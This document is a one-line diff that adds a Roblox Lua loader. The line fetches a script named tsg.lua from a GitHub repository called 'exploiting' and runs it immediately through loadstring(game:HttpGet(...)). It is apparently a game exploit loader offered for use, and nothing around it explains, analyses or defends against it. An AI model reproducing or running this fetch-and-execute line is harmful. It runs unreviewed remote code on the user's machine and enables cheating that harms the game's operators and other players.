@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/exploiting/main/tsg.lua", true))()
